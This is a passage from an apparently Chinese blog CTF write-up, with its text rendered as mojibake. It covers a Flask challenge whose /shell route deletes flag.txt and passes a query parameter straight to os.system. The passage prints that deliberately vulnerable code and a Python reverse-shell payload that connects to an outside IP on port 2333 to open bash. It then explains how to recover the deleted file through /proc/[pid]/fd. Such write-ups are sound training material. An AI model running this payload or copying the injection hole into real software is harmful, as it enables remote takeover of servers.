é™¤ï¼Œä¹Ÿå¯ä»¥åœ¨<code>/proc/[pid]/fd/</code>è¿™ä¸ªç›®å½•ä¸‹çœ‹åˆ°è¯¥æ–‡ä»¶çš„å†…å®¹ã€‚**å…¶å®ï¼Œ<code>/proc/pid/fd/</code>è¿™ä¸ªç›®å½•åŒ…å«äº†è¿›ç¨‹æ‰“å¼€æ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œè¿™äº›æè¿°ç¬¦æ˜¯æŒ‡å‘å®é™…æ–‡ä»¶çš„ç¬¦å·é“¾æ¥ã€‚å…·ä½“å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š<a href="https://www.jianshu.com/p/662293f12a47" target="_blank" rel="noopener noreferrer">Linuxæ¢å¤è¯¯åˆ é™¤çš„æ–‡ä»¶æˆ–è€…ç›®å½•<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <p>é¢˜ç›®ç›´æ¥ç»™äº†æºç </p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request
<span class="token keyword">import</span> os

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

flag_file <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">&quot;flag.txt&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;r&quot;</span><span class="token punctuation">)</span>

<span class="token comment"># flag = flag_file.read()</span>
<span class="token comment"># flag_file.close()</span>
<span class="token comment">#</span>
<span class="token comment"># @app.route('/flag')</span>
<span class="token comment"># def flag():</span>
<span class="token comment">#     return flag</span>
<span class="token comment">## want flag? naive!</span>

<span class="token comment"># You will never find the thing you want:) I think</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/shell'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">shell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">&quot;rm -f flag.txt&quot;</span><span class="token punctuation">)</span>
    exec_cmd <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'c'</span><span class="token punctuation">)</span>
    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>exec_cmd<span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token string">&quot;1&quot;</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">source</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">&quot;app.py&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;r&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&quot;__main__&quot;</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br></div></div><p>é¢˜ç›®å‘Šè¯‰æˆ‘ä»¬flagåœ¨<code>flag.txt</code>ä¸­ï¼Œåœ¨<code>/shell</code>è·¯ç”±ä¸‹å­˜åœ¨æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„åŠŸèƒ½ï¼Œä½†æ˜¯åªä¼šå›æ˜¾<code>1</code>ï¼Œå¹¶ä¸”æ¯æ¬¡è¿›å…¥è¯¥è·¯ç”±ä¸‹éƒ½ä¼šå°†flag.txtåˆ é™¤ã€‚</p> <p>ä½†æ˜¯é¢˜ç›®æ˜¯åœ¨æ²¡æœ‰å°†<code>flag.txt</code>å…³é—­çš„æƒ…å†µä¸‹ç›´æ¥åˆ é™¤çš„ï¼Œç»“åˆæˆ‘ä»¬åœ¨ä¸€å¼€å§‹å°±è¯´çš„çŸ¥è¯†ç‚¹ï¼Œå¯ä»¥è¿›è¡Œåå¼¹shellï¼Œç„¶åå»<code>/proc/[pid]/fd/</code>è¿™ä¸ªç›®å½•ä¸‹æ‰¾åˆ°flag.txtçš„ç¬¦å·é“¾æ¥ï¼Œé€šè¿‡<code>cat</code>è¯¥ç¬¦å·é“¾æ¥ï¼Œå°±èƒ½å¾—åˆ°flag.txtçš„å†…å®¹ã€‚</p> <p>ç”¨å°å·åœ¨BUUOJçš„Basicåˆ†åŒºå¼€ä¸€å°Linuxä¸»æœºï¼Œç”¨sshè¿œç¨‹ç™»å½•</p> <p><code>ssh -p 28624 root@node3.buuoj.cn</code></p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200803173824.png" alt="image-20200803173817343"></p> <p>æŸ¥çœ‹ipåœ°å€å¹¶ç›‘å¬2333ç«¯å£</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200803174113.png" alt="image-20200803174113282"></p> <p>åœ¨<code>/shell</code>è·¯ç”±ä¸‹åå¼¹shellï¼Œç”±äºæ˜¯flaskæ¡†æ¶ï¼Œè€ƒè™‘ä½¿ç”¨pythonåå¼¹shellï¼Œpayloadå¦‚ä¸‹ï¼š</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token operator">/</span>shell?c<span class="token operator">=</span>python3 <span class="token operator">-</span>c <span class="token string">&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('174.2.189.144',2333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);&quot;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>åå¼¹shellæˆåŠŸ</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200803174943.png" alt="image-20200803174943180"></p> <p>åœ¨<code>/prco/[pid]/fd/</code>ç›®å½•ä¸‹å¯»æ‰¾flag</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200803175207.png" alt="image-20200803175207894"></p></div></div> <div class="page-edit"><!----> <div class="tags"><a href="/tags/?tag=WP" title="æ ‡ç­¾">#WP</a></div> <!----></div> <div class="page-nav-wapper"><!----> <!----></div></div> <div class="article-list"><div class="article-title"><a href="/archives/" class="iconfont icon-bi">æœ€è¿‘æ›´æ–°</a></div> <div class="article-wrapper"><dl><dd>01</dd> <dt><a href="/pages/152581/"><div>RMIä¸JNDIï¼ˆä¸€ï¼‰</div></a> <span>01-29</span></dt></dl><dl><dd>02</dd> <dt><a href="/pages/fae557/"><div>Java8-Stream</div></a> <span>01-03</span></dt></dl><dl><dd>03</dd> <dt><a href="/pages/5d070a/"><div>è°ˆä¸€è°ˆJavaåŠ¨æ€åŠ è½½å­—èŠ‚ç çš„æ–¹å¼</div></a> <span>12-18</span></dt></dl> <dl><dd></dd> <dt><a href="/archives/" class="more">æ›´å¤šæ–‡ç« &gt;</a></dt></dl></div></div> </main></div> <div class="footer"><div class="icons"></div> 
  Theme by
  <a href="https://github.com/xugaoyi/vuepress-theme-vdoing" target="_blank" title="æœ¬ç«™ä¸»é¢˜">Vdoing</a> 
    | Copyright Â© 2019-2021
    <span></span></div> <div class="buttons"><div title="è¿”å›é¡¶éƒ¨" class="button blur go-to-top iconfont icon-fanhuidingbu" style="display:none;"></div> <div title="å»è¯„è®º" class="button blur go-to-comment iconfont icon-pinglun" style="display:none;"></div> <div title="ä¸»é¢˜æ¨¡å¼" class="button blur theme-mode-but iconfont icon-zhuti"><ul class="select-box" style="display:none;"><li class="iconfont icon-zidong">è·Ÿéšç³»ç»Ÿ</li><li class="iconfont icon-rijianmoshi">æµ…è‰²æ¨¡å¼</li><li class="iconfont icon-yejianmoshi">æ·±è‰²æ¨¡å¼</li><li class="iconfont icon-yuedu">é˜…è¯»æ¨¡å¼</li></ul></div></div> <!----></div><div class="global-ui"><div></div></div></div>
    <script src="/assets/js/app.23243609.js" defer></script><script src="/assets/js/2.b6b5fde6.js" defer></script><script src="/assets/js/9.e2574eb5.js" defer></script>
  </body>
</html>